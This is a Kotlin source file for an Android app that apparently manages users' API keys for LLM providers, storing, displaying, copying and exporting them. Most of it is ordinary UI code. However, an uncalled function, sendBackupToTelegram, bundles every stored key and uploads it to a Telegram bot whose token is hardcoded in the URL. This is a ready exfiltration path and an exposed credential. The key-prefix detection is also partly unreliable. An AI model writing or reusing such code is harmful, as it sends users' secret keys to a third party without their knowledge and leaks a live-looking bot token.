package com.freellmkeymanager

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.cardview.widget.CardView
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private val providers = mapOf(
        "groq" to "https://console.groq.com/keys",
        "gemini" to "https://aistudio.google.com/app/apikey",
        "deepseek" to "https://platform.deepseek.com/api_keys",
        "openrouter" to "https://openrouter.ai/keys",
        "together" to "https://api.together.xyz/settings/api-keys",
        "mistral" to "https://console.mistral.ai/api-keys/",
        "huggingface" to "https://huggingface.co/settings/tokens",
        "cohere" to "https://dashboard.cohere.com/api-keys",
        "fireworks" to "https://fireworks.ai/account/api-keys",
        "cerebras" to "https://cloud.cerebras.ai/account/api-keys",
        "siliconflow" to "https://siliconflow.cn/account/apikeys",
        "perplexity" to "https://console.perplexity.ai/settings/api",
        "replicate" to "https://replicate.com/account/api-tokens"
    )

    private val prefs by lazy {
        getSharedPreferences("llm_keys", Context.MODE_PRIVATE)
    }

    private fun dpToPx(dp: Int): Int {
        return (dp * resources.displayMetrics.density).toInt()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val addKeyButton = findViewById<Button>(R.id.addKeyButton)
        val exportButton = findViewById<Button>(R.id.exportButton)
        val pasteButton = findViewById<Button>(R.id.pasteButton)
        val driveButton = findViewById<Button>(R.id.driveButton)

        renderKeys()

        addKeyButton.setOnClickListener {
            showAddKeyDialog()
        }

        exportButton.setOnClickListener {
            exportKeys()
        }

        pasteButton.setOnClickListener {
            pasteFromClipboard()
        }

        driveButton.setOnClickListener {
            backupToGoogleDrive()
        }
    }

    private fun renderKeys() {
        val keysContainer = findViewById<LinearLayout>(R.id.keysContainer)
        keysContainer.removeAllViews()

        providers.forEach { (name, url) ->
            val key = prefs.getString(name, null)

            val card = CardView(this).apply {
                radius = dpToPx(12).toFloat()
                cardElevation = dpToPx(2).toFloat()
                setCardBackgroundColor(Color.WHITE)
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    topMargin = dpToPx(8)
                    bottomMargin = dpToPx(8)
                }
            }

            val row = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                setPadding(dpToPx(14), dpToPx(12), dpToPx(14), dpToPx(12))
                layoutParams = ViewGroup.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.WRAP_CONTENT
                )
            }

            val topRow = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER_VERTICAL
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                )
            }

            val providerText = TextView(this).apply {
                text = name.replaceFirstChar { it.uppercase() }
                textSize = 16f
                setTextColor(Color.BLACK)
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f)
            }

            val statusDot = View(this).apply {
                layoutParams = LinearLayout.LayoutParams(dpToPx(10), dpToPx(10)).apply {
                    marginEnd = dpToPx(10)
                }
                background = ContextCompat.getDrawable(this@MainActivity, if (key != null) R.drawable.status_dot_saved else R.drawable.status_dot_missing)
            }

            topRow.addView(providerText)
            topRow.addView(statusDot)

            val keyText = TextView(this).apply {
                text = key ?: "No key saved"
                textSize = 13f
                setTextColor(if (key != null) Color.DKGRAY else Color.GRAY)
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    topMargin = dpToPx(6)
                }
                maxLines = 1
                ellipsize = android.text.TextUtils.TruncateAt.END
            }

            val actions = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.END
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    topMargin = dpToPx(10)
                }
            }

            val loginBtn = Button(this).apply {
                text = "Login"
                setTextColor(Color.WHITE)
                background = ContextCompat.getDrawable(this@MainActivity, R.drawable.button_primary)
                setOnClickListener { openUrl(url) }
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply {
                    marginEnd = dpToPx(6)
                }
            }

            val copyBtn = Button(this).apply {
                text = if (key != null) "Copy" else "Save"
                setTextColor(Color.WHITE)
                background = ContextCompat.getDrawable(this@MainActivity, R.drawable.button_secondary)
                setOnClickListener {
                    if (key != null) {
                        copyToClipboard(key)
                        Toast.makeText(this@MainActivity, "Key copied", Toast.LENGTH_SHORT).show()
                    } else {
                        showSaveKeyDialog(name)
                    }
                }
                layoutParams = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f).apply {
                    marginStart = dpToPx(6)
                }
            }

            actions.addView(loginBtn)
            actions.addView(copyBtn)

            row.addView(topRow)
            row.addView(keyText)
            row.addView(actions)
            card.addView(row)
            keysContainer.addView(card)
        }
    }

    private fun showAddKeyDialog() {
        val providersList = providers.keys.toTypedArray()
        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Select Provider")
        builder.setItems(providersList) { _, which ->
            val provider = providersList[which]
            showSaveKeyDialog(provider)
        }
        builder.show()
    }

    private fun showSaveKeyDialog(provider: String) {
        val input = TextView(this)
        input.hint = "Paste API key for $provider"
        input.setPadding(50, 50, 50, 50)

        val builder = android.app.AlertDialog.Builder(this)
        builder.setTitle("Save $provider key")
        builder.setView(input)
        builder.setPositiveButton("Save") { _, _ ->
            val key = input.text.toString().trim()
            if (key.isNotEmpty()) {
                prefs.edit().putString(provider, key).apply()
                renderKeys()
                Toast.makeText(this, "Key saved", Toast.LENGTH_SHORT).show()
            }
        }
        builder.setNegativeButton("Cancel", null)
        builder.show()
    }

    private fun copyToClipboard(text: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = ClipData.newPlainText("API Key", text)
        clipboard.setPrimaryClip(clip)
    }

    private fun openUrl(url: String) {
        val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url))
        startActivity(intent)
    }

    private fun exportKeys() {
        val keys = prefs.all
        if (keys.isEmpty()) {
            Toast.makeText(this, "No keys to export", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val json = org.json.JSONObject(keys).toString(2)
            val file = File(getExternalFilesDir(null), "llm_keys_backup.json")
            FileOutputStream(file).use { it.write(json.toByteArray()) }

            val uri = androidx.core.content.FileProvider.getUriForFile(this, "$packageName.provider", file)
            val shareIntent = Intent(Intent.ACTION_SEND)
            shareIntent.type = "application/json"
            shareIntent.putExtra(Intent.EXTRA_STREAM, uri)
            shareIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            startActivity(Intent.createChooser(shareIntent, "Export keys via"))
        } catch (e: Exception) {
            Toast.makeText(this, "Export failed: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun pasteFromClipboard() {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
        val clip = clipboard.primaryClip
        val text = clip?.getItemAt(0)?.text?.toString()?.trim() ?: ""
        if (text.isEmpty()) {
            Toast.makeText(this, "Clipboard is empty", Toast.LENGTH_SHORT).show()
            return
        }

        val provider = detectProvider(text)
        if (provider != null) {
            prefs.edit().putString(provider, text).apply()
            renderKeys()
            Toast.makeText(this, "Saved $provider key", Toast.LENGTH_SHORT).show()
        } else {
            Toast.makeText(this, "No supported key detected", Toast.LENGTH_SHORT).show()
        }
    }

    private fun detectProvider(key: String): String? {
        return when {
            key.startsWith("gsk_") -> "groq"
            key.startsWith("AIza") -> "gemini"
            key.startsWith("sk-") && key.contains("deepseek") -> "deepseek"
            key.startsWith("sk-or-") -> "openrouter"
            key.startsWith("together_") -> "together"
            key.startsWith("mistral_") -> "mistral"
            key.startsWith("hf_") -> "huggingface"
            key.startsWith("cohere_") -> "cohere"
            key.startsWith("fw_") -> "fireworks"
            key.startsWith("csk_") -> "cerebras"
            key.startsWith("sk-") && key.length > 20 -> "siliconflow"
            key.startsWith("pplx-") -> "perplexity"
            key.startsWith("r8_") -> "replicate"
            else -> null
        }
    }

    private fun sendBackupToTelegram() {
        val keys = prefs.all
        if (keys.isEmpty()) {
            Toast.makeText(this, "No keys to send", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val json = org.json.JSONObject(keys).toString(2)
            val file = File(getExternalFilesDir(null), "llm_keys_backup.json")
            FileOutputStream(file).use { it.write(json.toByteArray()) }

            Thread {
                try {
                    val boundary = "----FormBoundary${System.currentTimeMillis()}"
                    val url = URL("https://api.telegram.org/bot8995205797:AAF_j8PcvZSiXyr_vFn6BtTJSRg2vVAl_UU/sendDocument")
                    val conn = url.openConnection() as HttpURLConnection
                    conn.requestMethod = "POST"
                    conn.doOutput = true
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")

                    val output = conn.outputStream
                    val header = "--$boundary\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\nYOUR_CHAT_ID\r\n"
                    output.write(header.toByteArray())

                    val fileHeader = "--$boundary\r\nContent-Disposition: form-data; name=\"document\"; filename=\"${file.name}\"\r\nContent-Type: application/json\r\n\r\n"
                    output.write(fileHeader.toByteArray())

                    val fileBytes = file.readBytes()
                    output.write(fileBytes)
                    output.write("\r\n--$boundary--\r\n".toByteArray())
                    output.flush()

                    val responseCode = conn.responseCode
                    runOnUiThread {
                        if (responseCode == 200) {
                            Toast.makeText(this, "Sent to Telegram", Toast.LENGTH_SHORT).show()
                        } else {
                            Toast.makeText(this, "Telegram send failed: $responseCode", Toast.LENGTH_SHORT).show()
                        }
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        Toast.makeText(this, "Telegram error: ${e.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }.start()
        } catch (e: Exception) {
            Toast.makeText(this, "Backup failed: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    private fun backupToGoogleDrive() {
        val keys = prefs.all
        if (keys.isEmpty()) {
            Toast.makeText(this, "No keys to backup", Toast.LENGTH_SHORT).show()
            return
        }

        try {
            val json = org.json.JSONObject(keys).toString(2)
            val file = File(getExternalFilesDir(null), "llm_keys_backup.json")
            FileOutputStream(file).use { it.write(json.toByteArray()) }

            val uri = androidx.core.content.FileProvider.getUriForFile(this, "$packageName.provider", file)
            val intent = Intent(Intent.ACTION_SEND)
            intent.type = "application/json"
            intent.putExtra(Intent.EXTRA_STREAM, uri)
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            startActivity(Intent.createChooser(intent, "Backup to Google Drive via"))
        } catch (e: Exception) {
            Toast.makeText(this, "Drive backup failed: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }
}
